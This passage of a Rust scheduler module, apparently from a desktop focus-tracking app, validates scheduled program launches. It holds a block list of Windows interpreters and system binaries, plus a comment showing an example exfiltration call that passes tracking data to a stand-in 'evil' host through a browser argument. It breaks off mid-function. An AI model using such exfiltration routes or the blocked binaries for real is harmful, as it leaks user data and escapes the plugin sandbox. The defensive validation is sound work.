//! 定时任务模块。
//!
//! 镜像 Python 版 `scheduler.py`：
//! - 三种调度：daily（每日 HH:MM）/ once（一次性）/ interval（窗口内每 N 分钟）
//! - 后台检查线程（30 秒轮询），到点执行目标程序
//! - 启用/禁用/删除/编辑
//! - 持久化到 `data/focusflow_scheduler.db`

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use chrono::{Local, NaiveDateTime, Timelike};
use rusqlite::Connection;

use crate::paths;

/// 定时任务。
#[derive(Debug, Clone)]
pub struct ScheduledTask {
    pub id: i64,
    pub name: String,
    pub target_path: String,
    pub args: String,
    pub schedule_type: String,
    pub schedule_time: String,
    pub enabled: bool,
    pub last_run: Option<String>,
    pub created_at: String,
}

pub fn db_path() -> std::path::PathBuf {
    paths::data_dir().join("focusflow_scheduler.db")
}

fn open() -> rusqlite::Result<Connection> {
    std::fs::create_dir_all(paths::data_dir()).ok();
    let conn = Connection::open(db_path())?;
    conn.pragma_update(None, "journal_mode", "WAL").ok();
    conn.pragma_update(None, "synchronous", "NORMAL").ok();
    conn.busy_timeout(std::time::Duration::from_secs(15)).ok();
    Ok(conn)
}

/// 初始化表结构（幂等）。
pub fn init_db() -> anyhow::Result<()> {
    let conn = open()?;
    conn.execute_batch(
        "CREATE TABLE IF NOT EXISTS scheduled_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            target_path TEXT NOT NULL,
            args TEXT,
            schedule_type TEXT NOT NULL DEFAULT 'daily',
            schedule_time TEXT NOT NULL,
            enabled INTEGER NOT NULL DEFAULT 1,
            last_run TEXT,
            created_at TEXT NOT NULL
        );",
    )?;
    // 把遗留的 NULL `args` 补成空串。schema 里这列可空（Python 版就这么存），而读侧
    // 要把它当非 Option 的 String 用；库里留着 NULL 的话，那条任务会在所有"要读 args"
    // 的面上凭空消失（见 get_all_tasks 的逐行解码）。补一次比在每个读点各自兜底强。
    let n = conn
        .execute("UPDATE scheduled_tasks SET args='' WHERE args IS NULL", [])
        .map_err(|e| anyhow::anyhow!("补齐 args 为 NULL 的定时任务失败: {e}"))?;
    if n > 0 {
        tracing::warn!("定时任务库里有 {n} 条 args 为 NULL 的记录（旧版本遗留），已补成空串");
    }
    // 同一手的第二件：把 `schedule_time` 的首尾空格清掉。写侧现在存的就是 trim 过的
    // 值，但库里可能躺着旧写法留下的 `"2026-12-01 10:00 "` —— 而 `should_run` 拿原串
    // 去 parse，那种行会永远解析失败、永远不执行、也一行日志都不留。
    // 旧版 Python 的调度库是整份复制进来的（`migration.rs` 的 AUX_DBS），那批行
    // 靠写侧修不到，只能在这里规范化一次。
    let n = conn
        .execute(
            "UPDATE scheduled_tasks SET schedule_time = TRIM(schedule_time) WHERE schedule_time != TRIM(schedule_time)",
            [],
        )
        .map_err(|e| anyhow::anyhow!("规范化 schedule_time 的定时任务失败: {e}"))?;
    if n > 0 {
        tracing::warn!("定时任务库里有 {n} 条 schedule_time 带首尾空格（旧版本遗留），已规范化");
    }
    Ok(())
}

/// 允许作为定时任务目标的扩展名。
///
/// 只有 `.exe`。另外三类都各自对应一个确定缺陷，不是「暂未支持」：
/// - `.bat` / `.cmd`：`CreateProcess` 不直接执行批处理，而是交给 `cmd.exe` 解释，
///   且参数会被 cmd 二次解析（Rust 安全公告 RUSTSEC-2024-0037）。等于把黑名单里
///   刻意封掉的 `cmd.exe` 用扩展名请回来，而脚本内容不受任何白名单约束。
/// - `.lnk`：不是"暂未支持"，而是**不能直接启动** —— shell item 只有
///   `ShellExecute` 会解析，而 `ShellExecute` 会连链接自带的参数一起放行任意
///   程序（可以是 `cmd.exe`），整个白名单作废。现在走 [`launch_target_of`]：
///   先把链接指向的本体解析出来，按 `.exe` 那一套完整校验之后启动本体，
///   参数只用任务自己存的那份。
const EXECUTABLE_EXTENSIONS: [&str; 1] = ["exe"];

/// 明确禁止作为定时任务目标的可执行文件名（小写）。
///
/// 定时任务是「持久化的进程启动通道」，而插件 API 也暴露了它：任意 `.lua`
/// 若能用 `cmd.exe /c ...`、`powershell.exe -EncodedCommand ...` 之类启动解释器，
/// 就等于完整绕过插件沙箱（沙箱只剔除了 io/os 高危函数）。这里在入口与
/// 执行前双重拦截。
const BLOCKED_EXECUTABLES: [&str; 16] = [
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "installutil.exe",
    "msbuild.exe",
    "forfiles.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "conhost.exe",
    "explorer.exe",
    "wsl.exe",
];

/// 允许作为定时任务目标的可执行文件名（小写）。
///
/// 默认只放行常见「用户应用」：即便插件作者是恶意的，也无法借此启动解释器
/// 或系统二进制。用户可在 `config.ini` 的 `[scheduler] allow_extra` 里追加
/// 自己的白名单（逗号分隔的文件名），扩展时仍受 [`BLOCKED_EXECUTABLES`] 约束。
///
/// 这套控制挡住的是「文件名伪装」（改名、`..\`、8.3 短名、符号链接、非受信
/// 目录），挡不住**内容伪装**：能在 `C:\Windows\System32` 里创建一个硬链接并
/// 命名为 `calc.exe` 的前提是已经有管理员写权限，那时也不必绕这个白名单。
/// 也就是说这里的信任边界是「系统目录里的文件由 Windows 保护」，不是文件哈希。
const ALLOWED_EXECUTABLES: [&str; 24] = [
    "notepad.exe",
    "write.exe",
    "wordpad.exe",
    "mspaint.exe",
    "calc.exe",
    "charmap.exe",
    "snippingtool.exe",
    "magnify.exe",
    "osk.exe",
    "code.exe",
    "devenv.exe",
    "idea64.exe",
    "chrome.exe",
    "msedge.exe",
    "firefox.exe",
    "iexplore.exe",
    "opera.exe",
    "brave.exe",
    "vlc.exe",
    "wmplayer.exe",
    "spotify.exe",
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
];

/// 内置白名单程序允许存放的目录（已 canonicalize，供组件前缀比较）。
///
/// 只比对文件名等于允许把任意程序改名成 `notepad.exe` 丢进临时目录，
/// 因此内置白名单必须同时限制来源目录。
fn trusted_exe_dirs() -> Vec<std::path::PathBuf> {
    const KEYS: [&str; 5] = [
        "WINDIR",
        "SystemRoot",
        "ProgramFiles",
        "ProgramFiles(x86)",
        "ProgramW6432",
    ];
    let mut dirs = Vec::new();
    for key in KEYS {
        if let Some(p) = std::env::var_os(key) {
            let p = std::path::PathBuf::from(p);
            dirs.push(p.canonicalize().unwrap_or(p));
        }
    }
    dirs
}

/// Windows 路径大小写不敏感：按路径组件逐一比较，忽略 ASCII 大小写。
fn is_under(root: &std::path::Path, dir: &std::path::Path) -> bool {
    let mut r = root.components();
    let mut d = dir.components();
    loop {
        match (r.next(), d.next()) {
            (None, _) => return true,
            (Some(_), None) => return false,
            (Some(a), Some(b)) => {
                let same = match (a.as_os_str().to_str(), b.as_os_str().to_str()) {
                    (Some(x), Some(y)) => x.eq_ignore_ascii_case(y),
                    _ => a == b,
                };
                if !same {
                    return false;
                }
            }
        }
    }
}

/// `config.ini` `[scheduler] allow_extra` 追加的白名单（逗号分隔文件名）。
fn extra_allowed_executables() -> Vec<String> {
    crate::config::instance()
        .get_or("scheduler", "allow_extra", "")
        .split(',')
        .map(|s| s.trim().to_ascii_lowercase())
        .filter(|s| !s.is_empty())
        .collect()
}

/// 参数总长度上限：超出即拒绝，避免把整份追踪数据塞进一个参数。
const MAX_ARGS_LEN: usize = 260;

/// 按 shell 风格切分参数：空白分词，但双引号内的空白算作同一个参数。
///
/// 只用 `split_whitespace` 会把 `C:\My Notes\日报.txt` 拆成两个参数（第二个
/// 还带着引号），而引号又被参数白名单禁止 —— 等于「带空格的路径根本表达不出来，
/// 硬写就被静默拆错」。切分后再逐个校验去引号的值，安全性质不变。
fn split_args(raw: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_quote = false;
    let mut started = false;
    for c in raw.chars() {
        match c {
            '"' => {
                in_quote = !in_quote;
                started = true;
            }
            c if c.is_whitespace() && !in_quote => {
                if started {
                    out.push(std::mem::take(&mut cur));
                    started = false;
                }
            }
            c => {
                cur.push(c);
                started = true;
            }
        }
    }
    if started {
        out.push(cur);
    }
    out
}

/// 校验任务参数。
///
/// 定时任务是插件唯一的「带网络出口」通道：Lua 沙箱拿掉 io/os 后没有 socket，
/// 但白名单里有 `chrome.exe`/`msedge.exe`/`firefox.exe`，于是
/// `scheduler_add(..., "--app=https://evil/?d=<追踪数据>")` 就是一次静默外带。
/// 本函数的口径是「只启动程序，不指挥程序」：
/// - 拒绝开关（`-` 或 `/` 开头）：`--load-extension`、`--user-data-dir` 本身就是
///   任意代码执行入口，比 URL 外带更严重；
/// - 拒绝 URL 形态（含 `/`、`?`、`#`、`@`、`:` 非盘符）：外带的载体；
/// - 拒绝 UNC（`\\server\share`）：会让白名单程序向对端发起 NTLM 认证，等于凭据外带；
/// - 拒绝裸主机名（带 `.` 却不带 `\`，如 `www.attacker.tld`）：浏览器会把它当搜索词
///   送进默认搜索引擎，同样泄漏内容；
/// - 禁 shell 元字符与 `%VAR%` 展开、禁控制字符；
/// - 非 ASCII 只允许出现在「盘符绝对路径」里（`C:\笔记\日报.txt`）。这样中文路径可用，
///   又不必担心全角 `：／` 之类同形字绕过 scheme 判断——那条 token 不再是纯 ASCII，
///   也没有盘符前缀，直接被同一规则拦掉。
///
/// 双引号只作**分组**用途（`"C:\My Notes\日报.txt"` 算一个参数）：引号在逐条校验前
/// 就被 split_args 剥掉，里面的值仍要过同一套规则，所以它不构成绕行口子。
fn validate_task_args(args: &str) -> anyhow::Result<()> {
    let t = args.trim();
    if t.is_empty() {
        return Ok(());
    }
    if t.chars().count() > MAX_ARGS_LEN {
        anyhow::bail!("任务参数过长（上限 {MAX_ARGS_LEN} 字符）");
    }
    if t.chars().any(|c| c.is_control()) {
        anyhow::bail!("任务参数不能包含控制字符");
    }
    for tok in split_args(t) {
        if tok.starts_with('-') || tok.starts_with('/') {
            anyhow::bail!("任务参数不支持命令行开关（发现 {tok}）");
        }
        if tok.starts_with(r"\\") {
            anyhow::bail!("任务参数不支持 UNC 路径（会触发对外主机的 NTLM 认证）");
        }
        if tok.contains([
            '/', '&', '|', ';', '<', '>', '^', '%', '\'', '?', '#', '@', '*',
        ]) {
            anyhow::bail!("任务参数包含被禁止的字符或 URL 形态（{tok}）");
        }
        // 唯一允许的 `:` 是盘符分隔符：`C:\...`
        if let Some(i) = tok.find(':') {
            let b = tok.as_bytes();
            let is_drive = i == 1 && b[0].is_ascii_alphabetic() && b.get(i + 1) == Some(&b'\\');
            if !is_drive {
                anyhow::bail!("任务参数只能是本地绝对路径或简单名称（发现 {tok}）");
            }
        }
        let drive_path = tok.len() > 3
            && tok.as_bytes()[0].is_ascii_alphabetic()
            && tok.as_bytes()[1] == b':'
            && tok.as_bytes()[2] == b'\\';
        if !drive_path {
            if !tok.chars().all(|c| c.is_ascii_graphic()) {
                anyhow::bail!("非盘符绝对路径的参数只能是可打印 ASCII（发现 {tok}）");
            }
            if tok.contains('.') && !tok.contains('\\') {
                anyhow::bail!("任务参数需是带反斜杠的绝对路径，不接受裸主机名（{tok}）");
            }
        }
    }
    Ok(())
}

/// 校验任务目标路径：绝对路径、可 canonicalize（即真实存在且解析掉符号链接），
/// 扩展名为 `.exe`，文件名在白名单内且不在黑名单内；
/// 内置白名单还要求文件确实位于系统安装目录之一。
///
/// 定时任务是持久化的进程启动通道，入口（插件 API / 未来 UI）统一在此拦截；
/// [`execute_task`] 执行前还会再校验一次，防止库文件被外部改写后绕过入口。
fn validate_task_target(target_path: &str) -> anyhow::Result<()> {
    let t = target_path.trim();
    if t.is_empty() {
        anyhow::bail!("目标程序路径不能为空");
    }
    validate_exe_target(&launch_target_of(t)?)
}

/// 快捷方式扩展名（大小写不敏感）。
const LINK_EXTENSIONS: [&str; 1] = ["lnk"];

/// 读取 `.lnk` 的体积上限：真实快捷方式只有几 KB，超大文件一律拒绝，
/// 免得有人塞一个巨型文件让调度线程去 read 进内存。
const LNK_MAX_BYTES: u64 = 64 * 1024;

fn is_link_file(p: &std::path::Path) -> bool {
    p.extension()
        .and_then(|e| e.to_str())
        .map(|e| LINK_EXTENSIONS.contains(&e.to_ascii_lowercase().as_str()))
        .unwrap_or(false)
}

/// 把「任务里存的目标路径」换算成真正要 `CreateProcess` 的程序路径。
///
/// `.exe` 原样返回；`.lnk` 解析出链接指向的本体（只跟一级，不做链式跳转）。
/// 校验与执行共用这一个口径 —— 否则入口按解析后的目标放行、执行时却拿原始
/// `.lnk` 去启动（`CreateProcess` 不认 shell item），两边说的不是同一个东西。
fn launch_target_of(target: &str) -> anyhow::Result<std::path::PathBuf> {
    let p = std::path::Path::new(target);
    if !is_link_file(p) {
        return Ok(p.to_path_buf());
    }
    let size = match std::fs::metadata(p) {
        // stat 读不到原先被折成"体积异常"这个**永久**判定（`unwrap_or(u64::MAX)`），
        // 于是盘 momentarily 不可用就等同于"这个快捷方式永远不合格"。
        Ok(m) => m.len(),
        Err(e) => {
            return Err(anyhow::Error::new(TargetCurrentlyUnavailable {
                shown: target.to_string(),
                reason: format!("快捷方式 stat 失败: {e}"),
            }))
        }
    };
    if size > LNK_MAX_BYTES {
        anyhow::bail!("快捷方式体积异常（{size} 字节），已拒绝读取: {target}");
    }
    let bytes = std::fs::read(p).map_err(|e| {
        anyhow::Error::new(TargetCurrentlyUnavailable {
            shown: target.to_string(),
            reason: format!("快捷方式不可读: {e}"),
        })
    })?;
    let resolved = parse_lnk_target(&bytes).ok_or_else(|| {
        anyhow::anyhow!(
            "无法从快捷方式中解析出本地目标程序（网络位置、控制面板项等一律不支持）: {target}"
        )
    })?;
    let rp = std::path::PathBuf::from(&resolved);
    if is_link_file(&rp) {
        anyhow::bail!("快捷方式指向另一个快捷方式，只支持一级链接: {target} -> {resolved}");
    }
    tracing::debug!("快捷方式 {target} 解析为目标 {resolved}");
    Ok(rp)
}

/// MS-SHLLINK 固定头长度（HeaderSize 必须是这个值）。
const LNK_HEADER_SIZE: usize = 76;

/// 从 Windows 快捷方式（MS-SHLLINK）里解析出目标程序路径。
///
/// 只取链接指向的**本体路径**，刻意忽略链接自带的 WorkingDir / Arguments /
/// IconLocation：否则一个 `.lnk` 就能往白名单程序的命令行里塞任意参数，而那正是
/// 这套白名单要挡住的事。也不解析 `LinkTargetIDList` 里的 PIDL（相对 CSIDL 的
/// 还原面太大、伪装空间也多），因此只认 `LinkInfo.LocalBasePath`。
///
/// 全程用带边界的取值：release 配置是 `panic = "abort"`，一次越界就是整个应用消失。
pub(crate) fn parse_lnk_target(bytes: &[u8]) -> Option<String> {
    // Shell Link 的 CLSID {00021401-0000-0000-C000-000000000046}，按小端原样存于头里。
    // 前三字节必须是 01 14 02 —— 早期 fixture 里写成 01 14 00 时，自造的用例全过、
    // 真实快捷方式全挂（校验和被测试与实现同时写错时，测试就一点用也没有）。
    const CLSID: [u8; 16] = [
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x46,
    ];
    let head = bytes.get(..LNK_HEADER_SIZE)?;
    if u32::from_le_bytes(head[0..4].try_into().ok()?) != LNK_HEADER_SIZE as u32 {
        return None;
    }
    if head[4..20] != CLSID {
        return None;
    }
    let flags = u32::from_le_bytes(head[20..24].try_into().ok()?);
    // MS-SHLLINK 2.1.1 的 LinkFlags。位序必须照抄：`0x02` 才是"带 LinkInfo"。
    // 本机开始菜单里 25 个真实快捷方式的 flags 都是 0x40DF，早先按 0x20/0x40
    // 判断时它们被整批判成不可解析（那两位其实是参数段与图标段）。
    const HAS_IDLIST: u32 = 0x0000_0001;
    const HAS_LINK_INFO: u32 = 0x0000_0002;
    const NO_LINK_INFO: u32 = 0x0000_0100;
    let mut off = LNK_HEADER_SIZE;
    if flags & HAS_IDLIST != 0 {
        let idlist_len = u16::from_le_bytes(bytes.get(off..off + 2)?.try_into().ok()?) as usize;
        off = off.checked_add(2)?.checked_add(idlist_len)?;
    }
    // 没有 LinkInfo 就只有 PIDL，而我们不解析 PIDL（相对 CSIDL 的还原面太大、
    // 能伪装的地方也多）
    if flags & HAS_LINK_INFO == 0 || flags & NO_LINK_INFO != 0 {
        return None;
    }
    const VOLUME_ID_AND_LOCAL_BASE_PATH: u32 = 0x0000_0001;
    let li = off;
    let li_size = u32::from_le_bytes(bytes.get(li..li + 4)?.try_into().ok()?) as usize;
    let li_flags = u32::from_le_bytes(bytes.get(li + 8..li + 12)?.try_into().ok()?);
    if li_flags & VOLUME_ID_AND_LOCAL_BASE_PATH == 0 {
        return None;
    }
    local_base_path_in_link_info(bytes, li, li_size)
}

/// LinkInfo 头部里"偏移字段"所在的字节区间（前 12 字节是 size / headerSize / flags）。
const LINK_INFO_FIELD_RANGE: std::ops::Range<usize> = 12..28;

/// 在 LinkInfo 里定位 LocalBasePath。
///
/// **刻意不假定字段顺序**：把头部每个 u32 都当成候选偏移，只接受指向
/// 「盘符 + 分隔符」形态字符串的那个。理由很实际 —— 本机开始菜单的真实快捷方式按
/// "第 4 个字段就是 LocalBasePathOffset" 来读，读到的全是 VolumeID 块（size + 类型
/// 3 + FILETIME + 卷标），真正的路径在下一个字段指向的位置；各家生成器的排布并不
/// 完全一致，而猜错的后果是拿一段二进制去启动。判定条件够硬（必须以 `X:\` 或
/// UTF-16 形态的 `X:\` 开头），指错的空间几乎没有。
fn local_base_path_in_link_info(bytes: &[u8], li: usize, li_size: usize) -> Option<String> {
    let end = li.checked_add(li_size)?.min(bytes.len());
    let limit = li.checked_add(LINK_INFO_FIELD_RANGE.end)?.min(end);
    let mut o = li.checked_add(LINK_INFO_FIELD_RANGE.start)?;
    while o + 4 <= limit {
        let candidate = u32::from_le_bytes(bytes[o..o + 4].try_into().ok()?) as usize;
        if candidate > 0 {
            if let Some(p) = read_path_at(bytes, li.checked_add(candidate)?) {
                return Some(p);
            }
        }
        o += 4;
    }
    None
}

/// 从 `at` 处读一条路径字符串，ANSI 与 UTF-16LE 两种形态都认。
///
/// 形态不符（不是「盘符 + 分隔符」开头、含控制字符、超长、找不到结束符）一律 None：
/// 宁可让调用方给出"解析不出目标"的明确拒绝，也不猜一个路径出来开进程。
fn read_path_at(bytes: &[u8], at: usize) -> Option<String> {
    let head3 = bytes.get(at..at + 3)?;
    if head3[0].is_ascii_alphabetic() && head3[1] == b':' && matches!(head3[2], b'\\' | b'/') {
        let mut out: Vec<u8> = Vec::new();
        let mut terminated = false;
        let mut i = at;
        while let Some(&b) = bytes.get(i) {
            if b == 0 {
                terminated = true;
                break;
            }
            if !b.is_ascii_graphic() && b != b' ' {
                return None;
            }
            out.push(b);
            if out.len() > 4096 {
                return None;
            }
            i += 1;
        }
        // 没有结束符就是被截断过：这时候拿到的是半个路径，绝不能拿去启动
        if !terminated || out.is_empty() {
            return None;
        }
        return String::from_utf8(out).ok();
    }
    let head6 = bytes.get(at..at + 6)?;
    if head6[0].is_ascii_alphabetic()
        && head6[1] == 0
        && head6[2] == b':'
        && head6[3] == 0
        && matches!(head6[4], b'\\' | b'/')
        && head6[5] == 0
    {
        let mut vals: Vec<u16> = Vec::new();
        let mut i = at;
        loop {
            let u = u16::from_le_bytes(bytes.get(i..i + 2)?.try_into().ok()?);
            if u == 0 {
                break;
            }
            if u < 0x20 {
                return None;
            }
            vals.push(u);
            if vals.len() > 4096 {
                return None;
            }
            i += 2;
        }
        let s = String::from_utf16(&vals).ok()?;
        if !s.is_empty() {
            return Some(s);
        }
    }
    None
}

/// 对一个**已经确定要启动的程序路径**做全部白名单校验（绝对路径、可 canonicalize、
/// `.exe`、文件名黑白名单、内置白名单还要求来源目录可信）。
fn validate_exe_target(p: &std::path::Path) -> anyhow::Result<()> {
    let shown = p.display();
    if !p.is_absolute() {
        anyhow::bail!("目标程序必须是绝对路径: {shown}");
    }
    let ext_ok = p
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| EXECUTABLE_EXTENSIONS.contains(&e.to_ascii_lowercase().as_str()))
        .unwrap_or(false);
    if !ext_ok {
        anyhow::bail!(
            "目标程序仅支持 {}（快捷方式会先解析成它指向的 .exe）",
            EXECUTABLE_EXTENSIONS
                .iter()
                .map(|e| format!(".{e}"))
                .collect::<Vec<_>>()
                .join(" / ")
        );
    }
    // 必须 canonicalize：它把 `..\`、8.3 短名、符号链接/junction 全部还原成真实
    // 路径，后续的文件名与来源目录判断才有意义（否则 `notepad.exe` 可以是任何文件）。
    let canon = match p.canonicalize() {
        Ok(c) => c,
        Err(e) => {
            // 打不开/查不到 = 此刻的状态，不是"这个目标不该跑"（见类型注释）
            return Err(anyhow::Error::new(TargetCurrentlyUnavailable {
                shown: shown.to_string(),
                reason: e.to_string(),
            }));
        }
    };
    let file_name = canon
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    if !file_name.ends_with(".exe") {
        anyhow::bail!("canonicalize 后目标不是 .exe: {file_name}");
    }
    if BLOCKED_EXECUTABLES.contains(&file_name.as_str()) {
        anyhow::bail!("{file_name} 属于被禁止的解释器/系统程序，不能作为定时任务目标");
    }
    let extra = extra_allowed_executables();
    let from_extra = extra.contains(&file_name);
    if !ALLOWED_EXECUTABLES.contains(&file_name.as_str()) && !from_extra {
        anyhow::bail!(
            "{file_name} 不在定时任务白名单内；如需放行请在 config.ini 的 \
             [scheduler] allow_extra 中添加该文件名"
        );
    }
    // 内置白名单只保证「这个文件名可信」，来源目录必须同时可信；
    // 用户在 allow_extra 里写的文件名是他自己的显式授权，不再限制目录。
    if !from_extra {
        let parent = canon.parent().unwrap_or(&canon);
        let trusted = trusted_exe_dirs();
        if !trusted.iter().any(|root| is_under(root, parent)) {
            anyhow::bail!(
                "{file_name} 不在系统安装目录内（实际位置 {}），可能是改名后的其他程序；\
                 确实需要请在 config.ini 的 [scheduler] allow_extra 中登记该文件名",
                parent.display()
            );
        }
    }
    Ok(())
}

/// 执行前的唯一决定：解析目标 → 校验解析结果 → 校验参数，返回真正要启动的路径。
///
/// 刻意只解析一次。早先的写法是 `validate_task_target(原始路径)`（内部解析一遍 `.lnk`）
/// 之后再 `launch_target_of(原始路径)`（又解析一遍）：两次之间链接文件被改写时，校验
/// 通过的就已经不是真正要启动的那个程序 —— 双次解析等于没校验。
fn approved_launch_target(target: &str, args: &str) -> anyhow::Result<std::path::PathBuf> {
    let exe = launch_target_of(target)?;
    validate_exe_target(&exe)?;
    validate_task_args(args)?;
    Ok(exe)
}

/// 「这一刻读不到它」，而**不是**「这个目标不该被启动」。
///
/// 休眠的 USB 盘、杀软首扫、开机还没就绪的网络盘都会让 `canonicalize`/`metadata`/`read`
/// 临时失败。调用方必须把它和真正的白名单拒绝分开 —— 后者重试多少次都不会变好，
/// 前者下一轮多半就好了。本文件 `LAUNCH_FAILURE_BACKOFF_AFTER` 那段注释早就把这类
/// 失败写成「瞬时」，只是执行路径从来没照这个分过（一律折成 `Refused`）。
///
/// 用类型而不是文本匹配来分派：`e.downcast_ref::<Self>()`。
#[derive(Debug)]
struct TargetCurrentlyUnavailable {
    shown: String,
    reason: String,
}

impl std::fmt::Display for TargetCurrentlyUnavailable {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "目标程序不可用: {}（{}）", self.shown, self.reason)
    }
}

impl std::error::Error for TargetCurrentlyUnavailable {}

/// 供 UI / 插件预检：目标程序与参数会不会被接受，返回可读原因。
///
/// 这是**预检**（不落库），给界面在用户点下之前把话说明白用。真正的判定以
/// [`add_task`] 的返回原因为准 —— 它才一次做完「目标 + 参数 + 调度」，而且不存在
/// 预检与入库之间文件被改掉的窗口。
pub fn check_target(target_path: &str, args: &str) -> Result<(), String> {
    validate_task_target(target_path)
        .and_then(|_| validate_task_args(args))
        .map_err(|e| e.to_string())
}

/// 入库前的完整校验：目标、参数、调度。
///
/// 调度这一项早前**完全没有入口校验**（只有 UI 侧的 `validate_schedule`，而定时任务
/// 唯一的入口是插件 API），于是 `"abc:xyz"` 这类值能入库；`should_run` 又把它按
/// 00:00 解释，任务一建出来就在当轮 30 秒轮询里立刻启动了目标程序。
fn validate_task_entry(
    target_path: &str,
    args: &str,
    schedule_type: &str,
    schedule_time: &str,
) -> anyhow::Result<()> {
    validate_task_target(target_path)?;
    validate_task_args(args)?;
    let (ok, msg) = validate_schedule(schedule_type, schedule_time);
    if !ok {
        anyhow::bail!("调度配置无效（{msg}）");
    }
    Ok(())
}

/// 添加定时任务，返回新记录 id；失败时给出可直接显示的原因。
pub fn add_task(
    name: &str,
    target_path: &str,
    args: &str,
    schedule_type: &str,
    schedule_time: &str,
    enabled: bool,
) -> anyhow::Result<i64> {
    if let Err(e) = validate_task_entry(target_path, args, schedule_type, schedule_time) {
        tracing::warn!("添加定时任务被拒绝（{name}）: {e}");
        return Err(e);
    }
    let created = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
    // 入库的必须是**校验过的那个串**：`validate_schedule` 判的是 trim 之后的值，
    // 而这里原先直接把原样字符串写下去。`"2026-12-01 10:00 "`（面板里从记事本粘出来
    // 很容易带上尾随空格）于是变成"校验通过、入库、然后 `should_run` 永远解析失败
    // 返回 false"——一条看着已排好、实际永不执行、也一行日志都没有的任务。
    let schedule_time = schedule_time.trim();
    let conn = open().map_err(|e| anyhow::anyhow!("打开调度库失败: {e}"))?;
    conn.execute(
        "INSERT INTO scheduled_tasks
         (name, target_path, args, schedule_type, schedule_time, enabled, created_at)
         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
        rusqlite::params![
            name,
            target_path,
            args,
            schedule_type,
            schedule_time,
            if enabled { 1 } else { 0 },
            created
        ],
    )
    .map_err(|e| anyhow::anyhow!("写入定时任务失败: {e}"))?;
    Ok(conn.last_insert_rowid())
}

/// 更新任务（None 字段保持原值）；失败时给出可直接显示的原因。
pub fn update_task(
    id: i64,
    name: Option<&str>,
    target_path: Option<&str>,
    args: Option<&str>,
    schedule_type: Option<&str>,
    schedule_time: Option<&str>,
    enabled: Option<bool>,
) -> anyhow::Result<()> {
    if let Some(a) = args {
        if let Err(e) = validate_task_args(a) {
            tracing::warn!("更新定时任务被拒绝（id={id}）: {e}");
            return Err(e);
        }
    }
    // 读取当前值。last_run 必须在**同一次** SELECT 里读回来：分成两次时第二次的
    // `.ok().flatten()` 把"读失败"和"这一条没有 last_run"并成一件 —— 库 BUSY 超过
    // 15 秒那一瞬，更新照样返回 Ok，而写回的 NULL 抹掉的正是防同日重跑的锚
    // （那条 09:00 的任务当天会被再启动一遍）。
    let conn = open()?;
    let existing = match conn.query_row(
        "SELECT name, target_path, args, schedule_type, schedule_time, enabled, last_run FROM scheduled_tasks WHERE id=?1",
        [id],
        |r| {
            Ok((
                r.get::<_, String>(0)?,
                r.get::<_, String>(1)?,
                r.get::<_, Option<String>>(2)?.unwrap_or_default(),
                r.get::<_, String>(3)?,
                r.get::<_, String>(4)?,
                r.get::<_, i64>(5)?,
                r.get::<_, Option<String>>(6)?,
            ))
        },
    ) {
        Ok(v) => v,
        Err(rusqlite::Error::QueryReturnedNoRows) => {
            anyhow::bail!("定时任务不存在（id={id}）");
        }
        Err(e) => {
            let e = anyhow::anyhow!("读取定时任务失败（id={id}）: {e}");
            tracing::warn!("更新定时任务失败: {e}");
            return Err(e);
        }
    };
    let new_name = name.unwrap_or(&existing.0).to_string();
    let new_target = target_path.unwrap_or(&existing.1).to_string();
    // 目标**真的换了**才重新校验。原先判的是"调用方传了 target_path"，而这个函数唯一
    // 的调用方（插件页 scheduler_update，见 host.rs 的七参数绑定）永远把整条记录原样
    // 传回来 —— 于是程序被卸载或移走之后，这条任务连名字和时刻都改不动（想改也过不了
    // 目标那道闸）。传回来的就是库里存的那一条 ⇒ 没人改目标，不该拿库外的变化惩罚他。
    if target_path.is_some() && new_target != existing.1 {
        if let Err(e) = validate_task_target(&new_target) {
            tracing::warn!("更新定时任务被拒绝（id={id}）: {e}");
            return Err(e);
        }
    }
    let new_args = args.unwrap_or(&existing.2).to_string();
    let new_type = schedule_type.unwrap_or(&existing.3).to_string();
    // 入库一律写 trim 过的串（与 `add_task` 同一半）：`validate_schedule` 判的是 trim
    // 之后的值，写原样字符串就会留下 `"2026-12-01 10:00 "` 这种"校验通过、执行期永远
    // 解析失败、还一行日志都没有"的记录。
    let new_time = schedule_time.unwrap_or(&existing.4).trim().to_string();
    let new_enabled = enabled.unwrap_or(existing.5 != 0);

    // 调度必须按**合并后的整对**校验：只改 type（daily→once）而 time 还是 "09:00"
    // 时，两个字段各自看着都没问题，落库后却是一条永远不该执行的记录。
    let (ok, msg) = validate_schedule(&new_type, &new_time);
    if !ok {
        let e = anyhow::anyhow!("调度配置无效（{msg}）");
        tracing::warn!("更新定时任务被拒绝（id={id}）: {e}");
        return Err(e);
    }

    // 只有**调度时刻真的变了**才重置 last_run。原来判的是"调用方传了 schedule_time"，
    // 而插件侧的 scheduler_update 永远把整条记录原样传回来（host.rs 的绑定是七个参数
    // 一起给），于是改个名字、补一条白名单都会把 last_run 清空 —— 一条 09:00 的任务
    // 在 14:00 被编辑过一次，30 秒内就把那个程序又启动了一遍。
    // 比较也要按 trim 后的做：一条历史脏行 `"09:00 "` 被规范化成 `"09:00"` 不算
    // "改了调度时刻"，否则这次编辑会顺手清空 last_run、当天多启动一次。
    let schedule_changed = new_type != existing.3 || new_time != existing.4.trim();
    let last_run: Option<String> = if schedule_changed {
        None // 改了调度时刻：按新时刻重新计一次
    } else {
        existing.6 // 就是上面那次 SELECT 读回来的值，读失败已经在那里 return 了
    };

    conn.execute(
